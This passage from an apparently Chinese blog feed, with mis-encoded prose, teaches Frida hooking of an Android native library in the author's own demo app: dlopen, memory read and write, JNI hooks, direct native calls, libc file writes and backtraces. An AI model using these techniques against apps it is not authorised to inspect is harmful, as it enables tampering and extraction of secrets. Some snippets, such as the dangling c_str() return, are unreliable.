&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopenAddr, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123; <span class="comment">// dlopen(const char* filename, int flags)</span></span><br><span class="line">                <span class="keyword">let</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>(); <span class="comment">// &quot;/data/app/com.zyc.fridasodemo-1/lib/x86/libnative-lib.so&quot;</span></span><br><span class="line">                <span class="keyword">if</span> (soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æˆåŠŸåŠ è½½åˆ°äº†--&gt;&quot;</span> + soName);</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hasloaded</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123; <span class="comment">//onLeave()ä¸­æ‰æ˜¯dlopen()åŠ è½½å®Œæˆå</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">hasloaded</span>) &#123;</span><br><span class="line">                    <span class="title function_">hooImEx</span>(); <span class="comment">// ç­‰soåŠ è½½å®Œæˆå°±æ‰§è¡Œå¯¼å…¥/å¯¼å‡ºå‡½æ•°æ‰“å°</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œç‚¹å‡»æŒ‰é’®å¯¼è‡´soåŠ è½½ï¼ŒHookåˆ°åŠ è½½è§¦å‘å¯¼å…¥&#x2F;å¯¼å‡ºå‡½æ•°æ‰“å°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171014507.gif" alt="img"> </p><h1 id="0x09-è¯»å†™å†…å­˜"><a href="#0x09-è¯»å†™å†…å­˜" class="headerlink" title="0x09 è¯»å†™å†…å­˜"></a>0x09 è¯»å†™å†…å­˜</h1><p>é€šè¿‡å†…å­˜åœ°å€æˆ‘ä»¬å¯ä»¥ç›´æ¥æ“ä½œå†…å­˜æ•°æ®ï¼Œä»¥ä¸‹é¢å­—ç¬¦ä¸²ä¸ºä¾‹ï¼Œè¿™æ˜¯ç”¨ä¾‹ä¸­print()è¿”å›çš„å­—ç¬¦ä¸²ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171014490.jpeg" alt="img"> </p><p>ç›´æ¥Hookæ“ä½œè¿™æ®µå†…å­˜ä¿®æ”¹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookMem</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> soAddress = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;soåŸºå€ï¼š&quot;</span> + soAddress);</span><br><span class="line">    <span class="keyword">if</span> (soAddress) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¯»å–...&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> strAddress = soAddress.<span class="title function_">add</span>(<span class="number">0x0D40</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ‰“å°è¿™æ®µå­—ç¬¦ä¸²ï¼š&quot;</span> + strAddress.<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¯»16å­—èŠ‚ï¼š&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(strAddress.<span class="title function_">readByteArray</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å†™å…¥...&quot;</span>);</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">protect</span>(strAddress, <span class="title class_">Process</span>.<span class="property">pageSize</span>, <span class="string">&quot;rw-&quot;</span>); <span class="comment">//ä¿®æ”¹å†…å­˜é¡µå±æ€§åå†å†™å…¥ï¼Œä¸ç„¶å¯èƒ½æŠ¥access violation accessing</span></span><br><span class="line">        strAddress.<span class="title function_">writeUtf8String</span>(<span class="string">&quot;123&quot;</span>) <span class="comment">//å†…å­˜å†™å…¥å­—ç¬¦ä¸²,è¯¥æ–¹æ³•æœ«å°¾ä¼šè‡ªåŠ¨æ·»åŠ &#x27;\0&#x27;</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\r\næ‰“å°è¿™æ®µå­—ç¬¦ä¸²ï¼š&quot;</span> + strAddress.<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¯»16å­—èŠ‚ï¼š\r\n&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(strAddress.<span class="title function_">readByteArray</span>(<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171016670.gif" alt="img"> </p><p>ä¹Ÿå¯ä»¥æŒ‰ç…§å­—èŠ‚ä¿®æ”¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strAddress.writeByteArray([0x41,0x41,0x41]);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171016295.jpeg" alt="img"> </p><h1 id="0x10-Hook-JNIå‡½æ•°"><a href="#0x10-Hook-JNIå‡½æ•°" class="headerlink" title="0x10 Hook JNIå‡½æ•°"></a>0x10 Hook JNIå‡½æ•°</h1><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦é€šè¿‡hook JNIå‡½æ•°æ¥è¾¾åˆ°ç›®çš„ï¼Œæ¯”å¦‚Hook RegisterNatives()æ‹¿åˆ°åŠ¨æ€æ³¨å†Œçš„å‡½æ•°ï¼Œæˆ–æ˜¯NewStringUTF()æŸ¥çœ‹åŠ è§£å¯†å­—ç¬¦ä¸²çš„æ„å»ºç­‰ï¼Œå®ç°JNIçš„hookå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸¤ç§æ–¹æ³•ï¼š</p><p>åç§»è®¡ç®—ï¼šæ‹¿åˆ°JNIEnvç»“æ„ä½“çš„åœ°å€ï¼ŒåŠ ä¸Šå‡½æ•°åœ¨ç»“æ„ä½“ä¸­çš„åç§»å³å¯ã€‚</p><p>libart.soï¼šä»libart.soä¸­éå†å‡ºè¦æ‰¾åˆ°çš„JNINativeMethodã€‚</p><h2 id="é€šè¿‡åç§»è®¡ç®—"><a href="#é€šè¿‡åç§»è®¡ç®—" class="headerlink" title="é€šè¿‡åç§»è®¡ç®—"></a>é€šè¿‡åç§»è®¡ç®—</h2><p>é¦–å…ˆæŠŠjni.hä¸­JNINativeInterfaceç»“æ„ä½“å£°æ˜æ ¼å¼åŒ–æˆå•è¡Œå½¢å¼ï¼ˆ<a href="https://download.csdn.net/download/zyc3545/15746526">ç‚¹æ­¤ä¸‹è½½</a>ï¼‰ï¼Œå¦‚æœè¦hook NewStringUTF()ï¼Œä»æ–‡ä»¶ä¸­æ‰¾åˆ°å…¶åœ¨168è¡Œ ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171018799.jpeg" alt="img"> </p><p>åˆ™å…¶åç§»åœ°å€ä¸º <strong>envæŒ‡å‘åœ°å€ + (168-1) x æŒ‡é’ˆå¤§å°</strong> ï¼Œä»¥æ­¤å†™å‡ºï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookJni</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">//è¿™æ ·æ‰èƒ½å–åˆ°envï¼Œå¦åˆ™ä¸ºnull</span></span><br><span class="line">        <span class="keyword">const</span> envAddr = <span class="title function_">ptr</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;envåœ°å€ï¼š&quot;</span> + envAddr);</span><br><span class="line">        <span class="keyword">const</span> envPointAddr = envAddr.<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;envæŒ‡å‘åœ°å€ï¼š&quot;</span> + envPointAddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> envPointAddr168 = envPointAddr.<span class="title function_">add</span>((<span class="number">168</span> - <span class="number">1</span>) * <span class="title class_">Process</span>.<span class="property">pointerSize</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;envåç§»168åœ°å€ï¼š&quot;</span> + envPointAddr168);</span><br><span class="line">        <span class="keyword">const</span> newStringUtfAddr = envPointAddr168.<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jniå‡½æ•°newStringUtfåœ°å€ï¼š&quot;</span> + newStringUtfAddr);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(newStringUtfAddr, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;é™„åŠ åˆ°newStringUtfå‡½æ•°...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> arg1 = args[<span class="number">1</span>].<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;NewStringUTFçš„args[1]:&quot;</span> + arg1);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;é™„åŠ åˆ°newStringUtfå‡½æ•°è¿”å›...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> ret = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(retval, <span class="literal">null</span>).<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¿”å›å€¼:&quot;</span> + ret);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171019558.gif" alt="img"> </p><h2 id="é€šè¿‡libart-so"><a href="#é€šè¿‡libart-so" class="headerlink" title="é€šè¿‡libart.so"></a>é€šè¿‡libart.so</h2><p>ä½¿ç”¨ <strong>Module.enumerateSymbols()</strong> éå†JNI å‡½æ•°ï¼Œå‡è®¾æˆ‘ä»¬è¦hook RegisterNatives()ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* typedef struct &#123;</span></span><br><span class="line"><span class="comment">*    const char* name;</span></span><br><span class="line"><span class="comment">*     const char* signature;</span></span><br><span class="line"><span class="comment">*     void*       fnPtr;</span></span><br><span class="line"><span class="comment">* &#125; JNINativeMethod;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookJniByArtSym</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> artSymbol = <span class="title class_">Module</span>.<span class="title function_">enumerateSymbols</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (artSymbol) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; artSymbol.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> element = artSymbol[i];</span><br><span class="line">            <span class="keyword">if</span> (element.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) != -<span class="number">1</span>) &#123; <span class="comment">//å‡½æ•°åæœ‰å¹²æ‰°å­—ç¬¦ï¼Œæ‰€ä»¥ç”¨indexOfè€Œä¸æ˜¯==ï¼ŒåŒæ—¶è¦æ’é™¤CheckJNIå‡½æ•°</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ‹¿åˆ°äº†å‡½æ•°:&quot;</span> + element.<span class="property">name</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‡½æ•°åœ°å€:&quot;</span> + element.<span class="property">address</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(element.<span class="property">address</span>, &#123;</span><br><span class="line">                    <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;é™„åŠ åˆ°RegisterNatives()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">let</span> <span class="title class_">JNINativeMethod</span> = args[<span class="number">2</span>]; <span class="comment">// jstring print_Dynamic(JNIEnv *env, jclass clazz, jstring a)</span></span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åŠ¨æ€æ³¨å†Œçš„å‡½æ•°åç§°:&quot;</span> + <span class="title class_">JNINativeMethod</span>.<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åŠ¨æ€æ³¨å†Œçš„å‡½æ•°ç­¾å:&quot;</span> + <span class="title class_">JNINativeMethod</span>.<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åŠ¨æ€æ³¨å†Œçš„å‡½æ•°åœ°å€:&quot;</span> + <span class="title class_">JNINativeMethod</span>.<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>*<span class="number">2</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123; &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç° <strong>Module.enumerateSymbols()</strong> ä¸€ç›´è·å–ä¸åˆ°å€¼ï¼ŒæŸ¥çœ‹å®˜ç½‘æ‰çŸ¥é“ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171019662.jpeg" alt="img"> </p><p>æ¢ä¸ªç¯å¢ƒæ¥è¿è¡Œå°±OKäº†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171019706.gif" alt="img"> </p><h1 id="0x11-ä¸»åŠ¨è°ƒç”¨"><a href="#0x11-ä¸»åŠ¨è°ƒç”¨" class="headerlink" title="0x11 ä¸»åŠ¨è°ƒç”¨"></a>0x11 ä¸»åŠ¨è°ƒç”¨</h1><p>ä¸»åŠ¨è°ƒç”¨<a href="https://so.csdn.net/so/search?q=Native&spm=1001.2101.3001.7020">Native</a>å‡½æ•°éœ€è¦ç”¨åˆ° NativeFunction(address, returnType, argTypes[, abi]) ï¼Œå…¶ä¸­returnTypeç±»å‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">pointer</span><br><span class="line">int</span><br><span class="line">uint</span><br><span class="line">long</span><br><span class="line">ulong</span><br><span class="line">char</span><br><span class="line">uchar</span><br><span class="line">size_t</span><br><span class="line">ssize_t</span><br><span class="line">float</span><br><span class="line">double</span><br><span class="line">int8</span><br><span class="line">uint8</span><br><span class="line">int16</span><br><span class="line">uint16</span><br><span class="line">int32</span><br><span class="line">uint32</span><br><span class="line">int64</span><br><span class="line">uint64</span><br><span class="line">bool</span><br></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªæµ‹è¯•å‡½æ•°æ–¹ä¾¿fridaè°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">jstring <span class="title function_">go</span><span class="params">(JNIEnv *env,jstring a)</span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str1 = <span class="string">&quot;Hello c++ &quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str2 = env-&gt;GetStringUTFChars(a,<span class="number">0</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> * ret = (<span class="built_in">std</span>::<span class="built_in">string</span>(str1) + <span class="built_in">std</span>::<span class="built_in">string</span>(str2)).c_str();</span><br><span class="line">    LOGE(<span class="string">&quot;go %s&quot;</span>,ret);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å‡½æ•°åœ°å€å’Œç­¾åæ„å»º <strong>NativeFunction</strong> ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookForward</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> methodAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x9540</span>); <span class="comment">//idaé™æ€åˆ†ææŸ¥çœ‹åˆ°go()åç§»0x9540</span></span><br><span class="line">        <span class="keyword">if</span> (methodAddr) &#123;</span><br><span class="line">            <span class="keyword">const</span> fun = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(methodAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]); <span class="comment">//jstring , env* éƒ½æ˜¯pointer</span></span><br><span class="line">            <span class="keyword">const</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">            <span class="keyword">let</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;zyc zyc&quot;</span>);</span><br><span class="line">            <span class="keyword">let</span> ret = <span class="title function_">fun</span>(env, jstr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¿”å›å€¼:&quot;</span>, env.<span class="title function_">getStringUtfChars</span>(ret, <span class="literal">null</span>).<span class="title function_">readCString</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171024753.gif" alt="img"> </p><h1 id="0x12-å†™å…¥æ–‡ä»¶"><a href="#0x12-å†™å…¥æ–‡ä»¶" class="headerlink" title="0x12 å†™å…¥æ–‡ä»¶"></a>0x12 å†™å…¥æ–‡ä»¶</h1><p>å†™å…¥æ–‡ä»¶å…¶å®å°±æ˜¯ä¸»åŠ¨è°ƒç”¨ <strong>libc.so</strong> ä¸­æ–‡ä»¶æ“ä½œç›¸å…³å‡½æ•°ï¼ˆè®°å¾—ç•™æ„apkçš„è¯»å†™æƒé™ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, FILE *stream)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span></span><br></pre></td></tr></table></figure><p>Hookä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookWriteFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//æ‹¿åˆ°æ–‡ä»¶ç›¸å…³å‡½æ•°åœ°å€</span></span><br><span class="line">    <span class="keyword">const</span> addr_fopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> addr_fputs = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> addr_fclose = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr_fopen &amp;&amp; addr_fputs &amp;&amp; addr_fclose) &#123;</span><br><span class="line">        <span class="comment">//é€šè¿‡åœ°å€æ„å»ºå‡½æ•°</span></span><br><span class="line">        <span class="keyword">const</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fopen, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">        <span class="keyword">const</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fputs, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">        <span class="keyword">const</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fclose, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ‰“å¼€æ–‡ä»¶...&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> filename = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/data/local/tmp/zyc.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> open_mode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> file = <span class="title function_">fopen</span>(filename, open_mode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å†™å…¥å†…å®¹</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å†™å…¥å†…å®¹...&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> content = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;zyc zyc\n&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> retval = <span class="title function_">fputs</span>(content, file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å…³é—­æ–‡ä»¶</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å…³é—­æ–‡ä»¶...&quot;</span>);</span><br><span class="line">        <span class="title function_">fclose</span>(file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171024282.jpeg" alt="img"> </p><h1 id="0x13-æ‰“å°å †æ ˆ"><a href="#0x13-æ‰“å°å †æ ˆ" class="headerlink" title="0x13 æ‰“å°å †æ ˆ"></a>0x13 æ‰“å°å †æ ˆ</h1><p>Nativeä¸­å¢åŠ å‡ ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">c</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">b</span><span class="params">()</span> &#123; c(); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">a</span><span class="params">()</span> &#123; b(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_zyc_fridasodemo_Calc_print</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    a();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onEnter()ä½¿ç”¨ <strong>Thread.backtrace()</strong> è·å–å †æ ˆä¿¡æ¯ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookBacktrace</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;_Z1cv&quot;</span>); <span class="comment">//å†…å­˜ä¸­ c() -- _Z1cv()</span></span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123; </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;c() called from:\n&#x27;</span> + </span><br><span class="line">                <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">                .<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>); <span class="comment">//mapä¸joinç”¨äºæ ¼å¼åŒ–</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œç„¶åhook print()å‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171032107.jpeg" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida Javaå±‚hook</title>
      <link href="/2024/07/14/frida%20Java%E5%B1%82hook/"/>
      <url>/2024/07/14/frida%20Java%E5%B1%82hook/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-æµ‹è¯•ç”¨ä¾‹"><a href="#0x00-æµ‹è¯•ç”¨ä¾‹" class="headerlink" title="0x00 æµ‹è¯•ç”¨ä¾‹"></a>0x00 æµ‹è¯•ç”¨ä¾‹</h1><p>æœ¬æ¬¡çš„hookä»£ç éƒ½ç”¨ pythonæ¥å£æ–¹å¼ ä¹¦å†™ã€‚é¦–å…ˆå†™ä¸€ä¸ªç®€å•çš„ç¨‹åºç”¨æ¥æµ‹è¯•ã€‚åç»­çš„æµ‹è¯•å°±åœ¨è¿™ä¸ªç¨‹åºä¸Šå°ä¿®å°æ”¹ï¼Œä¸åšèµ˜è¿°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:id=&quot;@+id/layout_main&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">    android:orientation=&quot;vertical&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id=&quot;@+id/btn_create&quot;</span><br><span class="line">        android:layout_width=&quot;match_parent&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_weight=&quot;1&quot;</span><br><span class="line">        android:text=&quot;å®ä¾‹åŒ–ä¸€ä¸ªCalc&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    